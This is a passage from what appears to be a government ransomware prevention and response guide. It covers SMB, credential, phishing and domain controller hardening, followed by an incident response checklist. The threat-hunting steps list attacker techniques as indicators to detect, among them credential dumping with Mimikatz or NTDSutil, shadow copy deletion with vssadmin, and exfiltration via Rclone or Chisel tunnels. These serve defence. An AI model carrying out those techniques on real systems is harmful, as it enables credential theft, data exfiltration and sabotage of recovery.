not members of an organization
s Microsoft Active Directory domains.
Disable the SMB Server service (
Server
) on Microsoft Windows and Windows
Server devices in instances where there is no need to remotely access files or to
name pipe application programming interfaces (APIs).
For more information guidance, see Microsoft
s Secure SMB Traffic in Windows
Server.
Consider requiring SMB encryption. To guarantee that SMB 3.1.1 clients always use
SMB Encryption, you must disable the SMB 1.0 server. For more information, refer to
Microsoft
s SMB security enhancements | Enable SMB Encryption and Reduced
performance after SMB Encryption or SMB Signing is enabled
If SMB encryption is not enabled, require SMB signing for both SMB client and server on
all systems. This will prevent certain adversary-in-the-middle and pass-the-hash attacks.
TLP:CLEAR
TLP:CLEAR
For more information on SMB signing, refer to Microsoft
s Overview of Server Message
Block Signing.
Require Kerberos authentication by hardening Universal Naming Convention (UNC).
OSs such as Microsoft Windows 10, Windows Server 2016, and later automatically
harden UNC for connections to the Microsoft Active Directory domain via SYSVOL and
NETLOGON shares. Additionally, network administrators can manually configure UNC
hardening for servers and shares in any supported Microsoft Windows operating system.
For more information, refer to Microsoft
s Vulnerability in Group Policy could allow
remote code execution. Using IP addresses to connect to SMB servers will result in the
use of NTLM authentication unless you also configure the use of Kerberos SPNs with IP
addresses, refer to Microsoft
s Configuring Kerberos for IP Address.
Use SMB over QUIC. Microsoft Windows 11, Windows Server 2022 Datacenter: Azure
Edition, and Android clients with a third-party SMB client support use of SMB over QUIC,
an alternative for SMB over TCP. The QUIC protocol is always Transport Layer Security
(TLS) 1.3 encrypted and uses certificate authentication to encapsulate all SMB traffic
including SMB
s own authentication
inside a VPN-like transport. SMB over QUIC
allows mobile users to safely connect over the public internet to edge SMB resources,
such as servers at the edge of organizational networks not completely behind a firewall,
but also works on internal networks that require the highest SMB transport security. For
more information, refer to Microsoft
s SMB over QUIC.
Log and monitor SMB traffic [CPG 2.T] to help flag potentially abnormal, harmful
behaviors.
Initial Access Vector: Compromised Credentials
Implement phishing-resistant MFA for all services, particularly for email, VPNs, and
accounts that access critical systems [CPG 2.H]. Escalate to senior management upon
discovery of systems that do not allow MFA, systems that do not enforce MFA, and any users
who are not enrolled with MFA.
Consider employing password-less MFA that replace passwords with two or more
verification factors (e.g., a fingerprint, facial recognition, device pin, or a cryptographic
key).
Consider subscribing to credential monitoring services that monitor the dark web for
compromised credentials.
Implement identity and access management (IAM) systems to provide administrators with
the tools and technologies to monitor and manage roles and access privileges of individual
network entities for on-premises and cloud applications.
Implement zero trust access control by creating strong access policies to restrict user to
resource access and resource-to-resource access. This is important for key management
resources in the cloud.
Change default admin usernames and passwords [CPG 2.A].
Do not use root access accounts for day-to-day operations. Create users, groups, and
roles to carry out tasks.
Page | 9
TLP:CLEAR
TLP:CLEAR
Implement password policies that require unique passwords of at least 15 characters.
[CPG 2.B] [CPG 2.C].
Enforce account lockout policies after a certain number of failed login attempts. Log and
monitor login attempts for brute force password cracking and password spraying [CPG 2.G].
Store passwords in a secured database and use strong hashing algorithms.
Disable saving passwords to the browser in the Group Policy Management console.
Implement Local Administrator Password Solution (LAPS) where possible if your OS is
older than Windows Server 2019 and Windows 10 as these versions do not have LAPS built in.
Note: The authoring organizations recommend organizations upgrade to Windows Server 2019
and Windows 10 or greater.
Protect against Local Security Authority Subsystem Service (LSASS) dumping:
Password managers can help you develop and manage secure passwords. Secure and
limit access to any password managers in use and enable all security features available
on the product in use, such as MFA.
Implement the Attack Surface Reduction (ASR) rule for LSASS.
Implement Credential Guard for Windows 10 and Server 2016. Refer to Microsoft
Manage Windows Defender Credential Guard for more information. For Windows Server
2012R2, enable Protected Process Light (PPL) for Local Security Authority (LSA).
Educate all employees on proper password security in your annual security training to
include emphasizing not reusing passwords and not saving passwords in local files.
Use Windows PowerShell Remoting, Remote Credential Guard, or RDP with restricted
Admin Mode as feasible when establishing a remote connection to avoid direct exposure of
credentials.
Separate administrator accounts from user accounts [CPG 2.E]. Only allow designated
admin accounts to be used for admin purposes. If an individual user needs administrative rights
over their workstation, use a separate account that does not have administrative access to other
hosts, such as servers. For some cloud environments, separate duties when the account used
to provision/manage keys does not have permission to use the keys and vice versa. As this
strategy introduces additional management overhead, it is not appropriate in all environments.
Initial Access Vector: Phishing
Implement a cybersecurity user awareness and
CISA offers a no-cost Phishing
training program that includes guidance on how to
Campaign Assessment and other
identify and report suspicious activity (e.g., phishing) or
no-cost assessments. Visit
incidents [CPG 2.I].
cisa.gov/cyber-resource-hub.
Implement flagging external emails in email clients.
Implement filters at the email gateway to filter out
emails with known malicious indicators, such as known malicious subject lines, and block
suspicious Internet Protocol (IP) addresses at the firewall [CPG 2.M].
Page | 10
TLP:CLEAR
TLP:CLEAR
Enable common attachment filters to restrict file types that commonly contain malware
and should not be sent by email. For more information, refer to Microsoft
s post Anti-malware
protection in EOP.
Review file types in your filter list at least semi-annually and add additional file types that
have become attack vectors. For example, OneNote attachments with embedded
malware have recently been used in phishing campaigns.
Malware is often compressed in password protected archives that evade antivirus
scanning and email filters.
Implement Domain-based Message Authentication, Reporting and Conformance
(DMARC) policy and verification to lower
Malicious Domain Blocking and Reporting
the chance of spoofed or modified emails
(MDBR) is a no-cost service for SLTT
from valid domains. DMARC protects your
organizations that is funded by CISA, the
domain from being spoofed but does not
MS-ISAC, and the EI-ISAC. This fully
protect from incoming emails that have been
managed security service prevents IT
spoofed unless the sending domain also
systems from connecting to harmful web
implements DMARC. DMARC builds on the
domains and protects against cyber threats,
widely deployed Sender Policy Framework
including:
(SPF) and Domain Keys Identified Mail
(DKIM) protocols, adding a reporting function
 Malware,
that allows senders and receivers to improve
and monitor protection of the domain from
 Ransomware, and
fraudulent email. For more information on
 Phishing.
DMARC, refer to CISA Insights Enhance
Email & Web Security and the Center for
To sign up for MDBR, visit cisecurity.org/msInternet Security
s blog How DMARC
isac/services/mdbr/.
Advances Email Security.
Ensure macro scripts are disabled for Microsoft Office files transmitted via email. These
macros can be used to deliver ransomware [CPG 2.N]. Note: Recent versions of Office are
configured by default to block files that contain Visual Basic for Applications (VBA) macros and
display a Trust Bar with a warning that macros are present and have been disabled. For more
information, refer to Microsoft
s Macros from the internet will be blocked by default in Office.
See Microsoft
s Block macros from running in Office files from the Internet for configuration
instructions to disable macros in external files for earlier versions of Office.
Disable Windows Script Host (WSH). Windows script hosting provides an environment in
which users can execute scripts or perform tasks.
Page | 11
TLP:CLEAR
TLP:CLEAR
Initial Access Vector: Precursor Malware Infection
Use automatic updates for your antivirus
and anti-malware software and
signatures. Ensure tools are properly
configured to escalate warnings and
indicators to notify security personnel. The
authoring organizations recommend using a
centrally managed antivirus solution. This
enables detection of both 
precursor
malware and ransomware.
A ransomware infection may be
evidence of a previous, unresolved
network compromise. For example, many ransomware infections are the result of
existing malware infections, such as QakBot, Bumblebee, and Emotet.
In some cases, ransomware deployment is the last step in a network compromise and is
dropped to obscure previous post-compromise activities, such as business email
compromise (BEC).
Use application allowlisting and/or endpoint detection and response (EDR) solutions on
all assets to ensure that only authorized software is executable and all unauthorized software is
blocked.
For Windows, enable Windows Defender Application Control (WDAC), AppLocker, or
both on all systems that support these features.
CISA and MS-ISAC encourage SLTT
organizations to use Albert IDS to enhance a
defense-in-depth strategy. Albert serves as
an early warning capability for U.S. SLTT
governments and supports nationwide
cybersecurity situational awareness and
defense. For more information regarding
Albert, visit cisecurity.org/services/albertnetwork-monitoring/.
WDAC is under continuous development while AppLocker will only receive
security fixes. AppLocker can be used as a complement to WDAC, when WDAC
is set to the most restrictive level possible, and AppLocker is used to fine-tune
restrictions for your organization.
Use allowlisting rather than attempting to list and deny every possible permutation of
applications in a network environment.
Consider implementing EDR for cloud-based resources.
Consider implementing an intrusion detection system (IDS) to detect command and control
activity and other potentially malicious network activity that occurs prior to ransomware
deployment.
o Ensure that the IDS is centrally monitored and managed. Properly configure the tools
and route warnings and indicators to the appropriate personnel for action.
Monitor indicators of activity and block malware file creation with the Windows Sysmon
utility. As of Sysmon 14, the FileBlockExecutable option can be used to block the creation
of malicious executables, Dynamic Link Library (DLL) files, and system files that match specific
hash values.
Page | 12
TLP:CLEAR
TLP:CLEAR
Initial Access Vector: Advanced Forms of
Social Engineering
Create policies to include
cybersecurity awareness training
about advanced forms of social
engineering for personnel that have
access to your network. Training should
include tips on being able to recognize
illegitimate websites and search results. It
is also important to repeat security
awareness training regularly to keep your
staff informed and vigilant.
Implement Protective Domain Name
System (DNS). By blocking malicious
internet activity at the source, Protective
DNS services can provide high network
security for remote workers. These
security services analyze DNS queries
and take action to mitigate threats
such
as malware, ransomware, phishing
attacks, viruses, malicious sites, and
spyware
leveraging the existing DNS
protocol and architecture. SLTT
s can
implement the no-cost MDBR service.
See NSA
s and CISA
s Selecting a
Protective DNS Service.
Consider implementing sandboxed
browsers to protect systems from
malware originating from web browsing.
Sandboxed browsers isolate the host
machine from malicious code.
Advanced forms of social engineering include:
 Search Engine Optimization (SEO) poisoning,
also known as search poisoning: When
malicious actors create malicious websites and
use SEO tactics to make them show up
prominently in search results. SEO poisoning
hijacks the search engine results of popular
websites and injects malicious links to boost
their placement in search results. These links
then lead unsuspecting users to phishing sites,
malware downloads, and other cyber threats.
 Drive-by-downloads (imposter websites):
When a user unintentionally downloads
malicious code by visiting a seemingly
legitimate website that is malicious. Malicious
actors use drive-by downloads to steal and
collect personal information, inject trojans, or
introduce exploit kits or other malware to
endpoints. Users may visit these sites by
responding to a phishing email or by clicking
on a deceptive pop-up window.
Malvertising
: Malicious advertising that
cybercriminals use to inject malware to users
computers when they visit malicious websites
or click an online advertisement. Malvertising
may also direct users to a corrupted website
where their data can be stolen, or malware can
be downloaded onto their computer.
Malvertising can appear anywhere, even at
sites you visit as part of your everyday web
browsing.
 Impersonating employees: Ransomware actors
have posed as company IT and/or helpdesk
staff in phone calls or SMS messages to obtain
credentials from employees and gain access to
the network.
Page | 13
TLP:CLEAR
TLP:CLEAR
Initial Access Vector: Third Parties and Managed Service Providers
Consider the risk management
and cyber hygiene practices of
third parties or managed service
providers (MSPs) your
organization relies on to meet its
mission. MSPs have been an
infection vector for ransomware
impacting numerous client
organizations [CPG 1.I].
Malicious actors may exploit the trusted relationships
your organization has with third parties and MSPs.
 Malicious actors may target MSPs with the goal of
compromising MSP client organizations; they may
use MSP network connections and access to
client organizations as a key vector to propagate
malware and ransomware.
 Malicious actors may spoof the identity of
or use
If a third party or MSP is
compromised email accounts associated with
responsible for maintaining
entities your organization has a trusted
and securing your
relationship with to phish your users, enabling
organization
s backups,
network compromise and disclosure of
ensure they are following
information.
the applicable best
practices outlined above.
Use contract language to formalize your security requirements as a best practice.
Ensure the use of least privilege and separation of duties when setting up the access of
third parties. Third parties and MSPs should only have access to devices and servers that are
within their role or responsibilities.
Consider creating service control policies (SCP) for cloud-based resources to prevent
users or roles, organization wide, from being able to access specific services or take
specific actions within services. For example, the SCP can be used to restrict users from
being able to delete logs, update virtual private cloud (VPC) configurations, and change log
configurations.
General Best Practices and Hardening Guidance
Ensure your organization has a comprehensive asset management approach [CPG 1.A].
Page | 14
Understand and take inventory of your
Tip: To facilitate asset tracking,
organization
s IT assets, logical (e.g., data,
use MS-ISAC
s Hardware and
software) and physical (e.g., hardware).
Software Asset Tracking
Know which data or systems are most critical for
Spreadsheet.
health and safety, revenue generation, or other
critical services, and understand any associated
interdependencies (e.g., 
system list 
 used to perform 
 is stored in critical asset
). This will aid your organization in determining restoration priorities should an
incident occur. Apply more comprehensive security controls or safeguards to critical
assets. This requires organization-wide coordination.
Ensure you store your IT asset documentation securely and keep offline backups and
physical hard copies on site.
TLP:CLEAR
TLP:CLEAR
Apply the principle of least privilege to all systems and services so that users only have
the access they need to perform their jobs [CPG 2.E]. Malicious actors often leverage privileged
accounts for network-wide ransomware attacks.
Ensure that all hypervisors and associated IT infrastructure, including network and
storage components, are updated and hardened. Emerging ransomware strategies have
begun targeting VMware ESXi servers, hypervisors, and other centralized tools and systems,
which enables fast encryption of the infrastructure at scale. For more information about
ransomware resilience and hardening of VMware and other virtualization infrastructure, see:
Restrict user permissions to install and run software applications.
Restrict user/role permissions to access or modify cloud-based resources.
Limit actions that can be taken on customer-managed keys by certain users/roles.
Block local accounts from remote access by using group policy to restrict network sign-in
by local accounts. For guidance, refer to Microsoft
s Blocking Remote Use of Local
Accounts and Security identifiers.
Use Windows Defender Remote Credential Guard and restricted admin mode for RDP
sessions.
Remove unnecessary accounts and groups and restrict root access.
Control and limit local administration.
Audit Active Directory (AD) for excessive privileges on accounts and group
memberships.
Make use of the Protected Users AD group in Windows domains to further secure
privileged user accounts against pass-the-hash attacks.
Audit user and admin accounts for inactive or unauthorized accounts quarterly. Prioritize
review of remote monitoring and management accounts that are publicly accessible
this includes audits of third-party access given to MSPs.
NIST Special Publication (SP 800-125A Rev.1): Security Recommendations for Serverbased Hypervisor Platforms
VMware: Cloud Infrastructure Security Configuration & Hardening
Leverage best practices and enable security settings in association with cloud
environments, such as Microsoft Office 365.
Page | 15
Review the shared responsibility model for cloud and ensure you understand what
makes up customer responsibility when it comes to asset protection.
Backup data often; offline or leverage cloud-to-cloud backups.
Enable logging on all resources and set alerts for abnormal usages.
Enable delete protection or object lock on storage resources often targeted in
ransomware attacks (e.g., object storage, database storage, file storage, and block
storage) to prevent data from being deleted or overwritten, respectively.
Consider enabling version control to keep multiple variants of objects in storage. This
allows for easier recovery from unintended or malicious actions.
TLP:CLEAR
TLP:CLEAR
Where supported, when using custom programmatic access to the cloud, use signed
application programming interface (API) requests to verify the identity of the requester,
protect data in transit, and protect against other attacks such as replay attacks.
For more information, refer to CISA Cybersecurity Advisory Microsoft Office 365 Security
Recommendations.
Mitigate the malicious use of remote access and remote monitoring and management
(RMM) software:
Audit remote access tools on your network to identify current or authorized RMM
software.
Review logs for execution of RMM software to detect abnormal use, or RMM software
running as a portable executable.
Use security software to detect instances of RMM software only being loaded in
memory.
Require authorized RMM solutions only be used from within your network over approved
remote access solutions, such as VPNs or virtual desktop interfaces (VDIs).
Block both inbound and outbound connections on common RMM ports and protocols at
the network perimeter.
Employ logical or physical means of network segmentation by implementing ZTA and
separating various business units or departmental IT resources within your organization and
maintain separation between IT and operational technology [CPG 2.F]. Network segmentation
can help contain the impact of any intrusion affecting your organization and prevent or limit
lateral movement on the part of malicious actors. Organizations should use due diligence when
segmenting networks and ensure network security policies are in place and adhered to because
segmentation can be rendered ineffective if it is breached through user error or non-adherence
to policies (e.g., connecting removable storage media or other devices to multiple segments).
Develop and regularly update comprehensive network diagram(s) that describes systems
and data flows within your organization
s network(s) (see Figure 1) [CPG 2.P]. This is
useful in steady state and can help incident responders understand where to focus their efforts.
See Figure 2 and Figure 3 for depictions of a flat (unsegmented) network and of a best practice
segmented network.
Page | 16
The diagram should include depictions of major networks, any specific IP addressing
schemes, and the general network topology including network connections,
interdependencies, and access granted to third parties, MSPs, and cloud connections
from external and internal endpoints.
Ensure you securely store network documentation and keep offline backups and hard
copies on site.
TLP:CLEAR
TLP:CLEAR
Figure 1: Example Network Diagram
Page | 17
TLP:CLEAR
TLP:CLEAR
Figure 2: Flat (Unsegmented) Network
Figure 3: Segmented Network
Restrict usage of PowerShell to specific users on a case-by-case basis by using Group
Policy. Typically, only users or administrators who manage a network or Windows OS are
permitted to use PowerShell. PowerShell is a cross-platform, command-line, shell, and scripting
language that is a component of Microsoft Windows. Threat actors use PowerShell to deploy
ransomware and hide their malicious activities. For more information, refer to the joint
Cybersecurity Information Sheet Keeping PowerShell: Security Measure to Use and Embrace.
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all
earlier PowerShell versions.
Ensure PowerShell instances, using the most current version, have module, script block,
and transcription logging enabled (enhanced logging).
Page | 18
Logs from Windows PowerShell prior to version 5.0 are either non-existent or do
not record enough detail to aid in enterprise monitoring and incident response
activities.
PowerShell logs contain valuable data, including historical OS and registry
interaction and possible tactics, techniques, and procedures of a threat actor
PowerShell use.
Two logs that record PowerShell activity are the 
PowerShell Windows Event
 log
and the 
PowerShell Operational
 log. The authoring organizations recommend
turning on these two Windows Event Logs with a retention period of at least 180
days.
These logs should be checked on a regular basis to confirm whether the log data
has been deleted or logging has been turned off. Set the storage size permitted
for both logs to as large as possible.
TLP:CLEAR
TLP:CLEAR
Secure domain controllers (DCs). Malicious actors often target and use DCs as a staging
point to spread ransomware network wide. To secure DCs:
Use the latest version of Windows Server supported by your organization on DCs.
Newer versions of Windows Server OS have more security features, including for Active
Directory, integrated. For guidance on configuring available security features refer to
Microsoft
s Best Practices for Securing Active Directory.
Ensure that DCs are regularly patched. Apply patches for critical vulnerabilities as soon
as possible.
Use open-source penetration testing tools, such as BloodHound or PingCastle, to verify
domain controller security.
Ensure that minimal software or agents are installed on DCs because these can be
leveraged to run arbitrary code on the system.
Restrict access to DCs to the Administrators group. Users within this group should be
limited and have separate accounts used for day-to-day operations with nonadministrative permissions. For more information, refer to Microsoft
s Securing Active
Directory Administrative Groups and Accounts.
The designated admin accounts should only be used for admin purposes. Ensure
that checking emails, web browsing, or other high-risk activities are not
performed on DCs.
Configure DC host firewalls to prevent internet access. Usually, DCs do not need direct
internet access. Servers with internet connectivity can be used to pull necessary
updates in lieu of allowing internet access for DCs.
Implement a privileged access management (PAM) solution on DCs to assist in
managing and monitoring privileged access. PAM solutions can also log and alert usage
to detect unusual activity.
Consider disabling or limiting NTLM and WDigest Authentication, if possible. Include
their use as criteria for prioritizing upgrading legacy systems or for segmenting the
network. Instead use modern federation protocols (e.g., SAML, OIDC or Kerberos) for
authentication with AES-256 bit
encryptionhttps://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Repo
rt_508c.pdf. If NTLM must be enabled:
Page | 19
The authoring organizations recommend using Windows Server 2019 or greater
and Windows 10 or greater as they have security features, such as LSASS
protections with Windows Credential Guard, Windows Defender, and
Antimalware Scan Interface (AMSI), not included in older operating system
Enable Extended Protection for Authentication (EPA) to prevent some NTLMrelay attacks. For more information, refer to Microsoft Mitigating NTLM Relay
Attacks on Active Directory Certificate Services (AD CS).
Enable NTLM auditing to ensure that only NTLMv2 responses are sent across
the network. Measures should be taken to ensure that LM and NTLM responses
are refused, if possible.
TLP:CLEAR
TLP:CLEAR
Enable additional protections for LSA Authentication to prevent code injection capable of
acquiring credentials from the system. Prior to enabling these protections, run audits
against lsass.exe to ensure an understanding of the programs that will be affected by
the enabling of this protection.
Retain and adequately secure logs from network devices, local hosts, and cloud
services. This supports triage and remediation of cybersecurity events. Logs can be analyzed
to determine the impact of events and ascertain if an incident has occurred [CPG 2.T].
o Set up centralized log management using a security information and event management
tool [CPG 2.U]. This enables an organization to correlate logs from both network and
host security devices. By reviewing logs from multiple sources, an organization can
triage an individual event and determine its impact to the organization.
o Maintain and back up logs for critical systems for a minimum of one year, if possible.
Establish a security baseline of normal network traffic and tune network appliances to
detect anomalous behavior. Tune host-based products to detect anomalous binaries, lateral
movement, and persistence techniques.
o Consider using business transaction logging
such as logging activity related to specific
or critical applications
for behavioral analytics.
Conduct regular assessments to ensure processes and procedures are up to date and can be
followed by security staff and end users.
Enable tracking prevention to limit the vectors that ad networks and trackers can use to track
user information.
Enable website typo protection to limit the possibility of logging onto spoofed websites or
other potential malicious links that could compromise a browser.
Enable browser-based AV for active scanning while browsing as an added layer of defense.
Block website notifications by default to limit site
s ability to track user data that can be
exploited.
Page | 20
TLP:CLEAR
TLP:CLEAR
Part 2: Ransomware and Data Extortion Response Checklist
Should your organization be a victim of
ransomware, follow your approved IRP. The
authoring organizations strongly recommend
responding by using the following checklist.
Be sure to move through the first three
steps in sequence.
Detection and Analysis
Refer to the best practices and references
below to help manage the risk posed by
ransomware and support your organization
coordinated and efficient response to a
ransomware incident. Apply these practices
to the greatest extent possible based on
availability of organizational resources.
The authoring organizations do not recommend
paying ransom. Paying ransom will not ensure your
data is decrypted, that your systems or data will no
longer be compromised, or that your data will not be
leaked.
Additionally, paying ransoms may pose sanctions
risks. For information on potential sanctions risks,
see U.S. Department of the Treasury Office of
Foreign Assets Control (OFAC) memorandum from
September 2021, Updated Advisory on Potential
Sanctions Risks for Facilitating Ransomware
Payments. The updated advisory states that
Treasury
s Office of Foreign Assets Control (OFAC)
would consider 'mitigating factors' in related
enforcement actions. Contact your local FBI field
office, in consultation with OFAC, for guidance on
mitigating penalty factors after an attack.
 1. Determine which systems were
impacted, and immediately isolate
them.
 If several systems or subnets
appear impacted, take the network offline at the switch level. It may not be feasible to
disconnect individual systems during an incident.
 Prioritize isolating critical systems that are essential to daily operations.
 If taking the network temporarily offline is not immediately possible, locate the network
cable (e.g., ethernet) and unplug affected devices from the network or remove them
from Wi-Fi to contain the infection.
 For cloud resources, take a snapshot of volumes to get a point in time copy for reviewing
later for forensic investigation.
 After an initial compromise, malicious actors may monitor your organization
s activity or
communications to understand if their actions have been detected. Isolate systems in a
coordinated manner and use out-of-band communication methods such as phone calls
to avoid tipping off actors that they have been discovered and that mitigation actions are
being undertaken. Not doing so could cause actors to move laterally to preserve their
access or deploy ransomware widely prior to networks being taken offline.
 2. Power down devices if you are unable to disconnect them from the network to avoid
further spread of the ransomware infection.
Note: This step will prevent your organization from maintaining ransomware infection artifacts
and potential evidence stored in volatile memory. It should be carried out only if it is not
possible to temporarily shut down the network or disconnect affected hosts from the
network using other means.
Page | 21
TLP:CLEAR
TLP:CLEAR
 3. Triage impacted systems for restoration and recovery.
 Identify and prioritize critical systems for restoration on a clean network and confirm the
nature of data housed on impacted systems.
Prioritize restoration and recovery based on a predefined critical asset list that
includes information systems critical for health and safety, revenue generation, or
other critical services, as well as systems they depend on.
Keep track of systems and devices that are not perceived to be impacted so they can be
deprioritized for restoration and recovery. This enables your organization to get back to
business in a more efficient manner.
 4. Examine existing organizational detection or prevention systems (e.g., antivirus, EDR,
IDS, Intrusion Prevention System) and logs. Doing so can highlight evidence of additional
systems or malware involved in earlier stages of the attack.
 Look for evidence of precursor 
dropper
 malware, such as Bumblebee, Dridex, Emotet,
QakBot, or Anchor. A ransomware event may be evidence of a previous, unresolved
network compromise.
Operators of these advanced malware variants will often sell access to a
network. Malicious actors will sometimes use this access to exfiltrate data and
then threaten to release the data publicly before ransoming the network to further
extort the victim and pressure them into paying.
Malicious actors often drop ransomware variants to obscure post-compromise
activity. Care must be taken to identify such dropper malware before rebuilding
from backups to prevent continuing compromises.
 5. Confer with your team to develop and document an initial understanding of what has
occurred based on initial analysis.
 6. Initiate threat hunting activities.
 For enterprise environments, check for:
Page | 22
Newly created AD accounts or accounts with escalated privileges and recent
activity related to privileged accounts such as Domain Admins.
Anomalous VPN device logins or other suspicious logins.
Endpoint modifications that may impair backups, shadow copy, disk journaling,
or boot configurations. Look for anomalous usage of built-in Windows tools such
as bcdedit.exe, fsutil.exe (deletejournal), vssadmin.exe, wbadmin.exe,
and wmic.exe (shadowcopy or shadowstorage). Misuse of these tools is a
common ransomware technique to inhibit system recovery.
Signs of the presence of Cobalt Strike beacon/client. Cobalt Strike is a
commercial penetration testing software suite. Malicious actors often name
Cobalt Strike Windows processes with the same names as legitimate Windows
processes to obfuscate their presence and complicate investigations.
TLP:CLEAR
TLP:CLEAR
Signs of any unexpected usage of remote monitoring and management (RMM)
software (including portable executables that are not installed). RMM software is
commonly used by malicious actors to maintain persistence.
Any unexpected PowerShell execution or use of PsTools suite.
Signs of enumeration of AD and/or LSASS credentials being dumped (e.g.,
Mimikatz, Sysinternals ProcDump, or NTDSutil.exe).
Signs of unexpected endpoint-to-endpoint (including servers) communications,
for example, Address Resolution Protocol (ARP) poisoning of an endpoint or
command and control traffic relayed between endpoints.
Potential signs of data being exfiltrated from the network, which may include:
Newly created services, unexpected scheduled tasks, unexpected software
installed, unusual files created, legitimate processes with unexpected child
processes, etc.
For cloud environments:
Page | 23
Abnormal amount of data outgoing over any port. Open source software
can tunnel data over various ports and protocols. For example,
ransomware actors have used Chisel to tunnel Secure Shell (SSH) over
HTTPS port 443. Ransomware actors have also used Cloudflared to
abuse Cloudflare tunnels to tunnel communications over HTTPS.
Presence of Rclone, Rsync, and various web-based file storage services,
and FTP/SFTP, which are common tools for data exfiltration (and also
used by threat actors to implant malware/tools on affected networks.)
Enable tools to detect and prevent modifications to IAM, network security, and
data protection resources.
Use automation to detect common issues (e.g., disabling features, introduction of
new firewall rules) and take automated actions as soon as they occur. For
example, if a new firewall rule is created that allows open traffic (0.0.0.0/0), an
automated action can be taken to disable or delete this rule and send
notifications to the user that created it as well as the security team for
awareness. This will help avoid alert fatigue and allow security personnel to
focus on critical issues.
TLP:CLEAR
TLP:CLEAR
Reporting and Notification
Note: Refer to the Contact Information
section at the end of this guide for details on
how to report and notify about ransomware
incidents.
If extended identification or analysis is needed, CISA, MSISAC and local, state, or federal law enforcement may be
interested in any of the following information that your
organization determines it can legally share:
 7. Follow notification requirements as
 Recovered executable file.
outlined in your cyber incident
 Copies of the readme file 
 DO NOT REMOVE the
response and communications plan
file or decryption may not be possible.
to engage internal and external
 Live memory (RAM) capture from systems with
teams and stakeholders with an
additional signs of compromise (use of exploit
understanding of what they can
toolkits, RDP activity, additional files found locally).
provide to help you mitigate, respond
to, and recover from the incident.
 Images of infected systems with additional signs of
 Share the information you
compromise (use of exploit toolkits, RDP activity,
have at your disposal to
additional files found locally).
receive timely and relevant
 Malware samples.
assistance. Keep
management and senior
 Names of malware identified on your network.
leaders informed via regular
 Encrypted file samples.
updates as the situation
develops. Relevant
 Log files (e.g., Windows event logs from
compromised systems, firewall logs).
stakeholders may include
your IT department, managed
 PowerShell scripts found having executed on the
security service providers,
network.
cyber insurance company,
 User accounts created in AD or machines added to
and departmental or elected
the network during the exploitation.
leaders [CPG 4.A].
 Report the incident to
 Email addresses used by the attackers and any
consider requesting
associated phishing emails.
assistance from
CISA, your
 Other communication accounts used by the
local FBI field office, the FBI
attackers.
Internet Crime Complaint
Center (IC3), or your local
 A copy of the ransom note.
U.S. Secret Service field
 Ransom amount and if the ransom was paid.
office.
 As appropriate, coordinate
 Bitcoin wallets used by the attackers.
with communications and
 Bitcoin wallets used to pay the ransom, if applicable.
public information personnel
to ensure accurate
 Copies of any communications with attackers.
information is shared
internally with your organization and externally with the public.
 8. If the incident resulted in a data breach, follow notification requirements as outlined in
your cyber incident response and communications plans.
Page | 24
TLP:CLEAR
TLP:CLEAR
Containment and Eradication
If no initial mitigation actions appear possible:
 9. Take a system image and memory
Upon voluntary request, CISA and MS-ISAC
capture of a sample of affected devices
(for SLTT organizations) can assist with
(e.g., workstations, servers, virtual
analysis of phishing emails, storage media,
servers, and cloud servers). Collect any
logs, and/or malware at no cost to help
relevant logs as well as samples of any
organizations understand the root cause of
precursor
 malware binaries and associated
an incident.
observables or indicators of compromise
(e.g., suspected command and control IP
 CISA 
 Advanced Malware Analysis
addresses, suspicious registry entries, or
Center: malware.us-cert.gov/
other relevant files detected). The contacts
 MS-ISAC 
 Malicious Code Analysis
below may be able to assist you in
Platform (SLTT organizations only):
performing these tasks.
cisecurity.org/spotlight/cybersecurity
 Preserve evidence that is highly
spotlight-malware-analysis/
volatile in nature
or limited in
retention
to prevent loss or
tampering (e.g., system memory,
Windows Security logs, data in firewall log buffers).
 10. Consult federal law enforcement, even if mitigation actions are possible, regarding
possible decryptors available, as security researchers may have discovered encryption flaws
for some ransomware variants and released decryption or other types of tools.
To continue taking steps to contain and mitigate the incident:
 11. Research trusted guidance (e.g., published by sources such as the U.S. Government,
MS-ISAC, or a reputable security vendor) for the particular ransomware variant and follow any
additional recommended steps to identify and contain systems or networks that are confirmed to
be impacted.
 Kill or disable the execution of known ransomware binaries; this will minimize damage
and impact to your systems. Delete other known associated registry values and files.
 12. Identify the systems and accounts involved in the initial breach. This can include email
accounts.
 13. Based on the breach or compromise details determined above, contain associated
systems that may be used for further or continued unauthorized access. Breaches often
involve mass credential exfiltration. Securing networks and other information sources from
continued credential-based unauthorized access may include:
 Disable virtual private networks, remote access servers, single sign-on resources, and
cloud-based or other public-facing assets.
Page | 25
TLP:CLEAR
TLP:CLEAR
 14. If server-side data is being encrypted by an infected workstation, follow server-side data
encryption quick identification steps.
 Review Computer Management > Sessions and Open Files lists on associated servers
to determine the user or system accessing those files.
 Review file properties of encrypted files or ransom notes to identify specific users that
may be associated with file ownership.
 Review the TerminalServices-RemoteConnectionManager event log to check for
successful RDP network connections.
 Review the Windows Security log, SMB event logs, and related logs that may identify
significant authentication or access events.
 Run packet capture software, such as Wireshark, on the impacted server with a filter to
identify IP addresses involved in actively writing or renaming files (e.g., smb2.filename
contains cryptxxx).
 15. Conduct extended analysis to identify outside-in and inside-out persistence
mechanisms.
 Outside-in persistence may include authenticated access to external systems via rogue
accounts, backdoors on perimeter systems, exploitation of external vulnerabilities, etc.
 Inside-out persistence may include malware implants on the internal network or a variety
of living-off-the-land style modifications (e.g., use of commercial penetration testing tools
like Cobalt Strike; use of PsTools suite, including PsExec, to remotely install and control
malware and gather information regarding
or perform remote management of
Windows systems; use of PowerShell scripts).
 Identification may involve deployment of EDR solutions, audits of local and domain
accounts, examination of data found in centralized logging systems, or deeper forensic
analysis of specific systems once movement within the environment has been mapped
out.
 16. Rebuild systems based on prioritization of critical services (e.g., health and safety or
revenue-generating services), using pre-configured standard images, if possible. Use
infrastructure as code templates to rebuild cloud resources.
 17. Issue password resets for all affected systems and address any associated
vulnerabilities and gaps in security or visibility once the environment has been fully cleaned
and rebuilt, including any associated impacted accounts and the removal or remediation of
malicious persistence mechanisms. This can include applying patches, upgrading software, and
taking other security precautions not previously taken. Update customer-managed encryption
keys as needed.
 18. The designated IT or IT security authority declares the ransomware incident over
based on established criteria, which may include taking the steps above or seeking outside
assistance.
Page | 26
TLP:CLEAR
TLP:CLEAR
Recovery and Post-Incident Activity
 19. Reconnect systems and restore data from offline, encrypted backups based on a
prioritization of critical services.
 Take care not to re-infect clean systems during recovery. For example, if a new Virtual
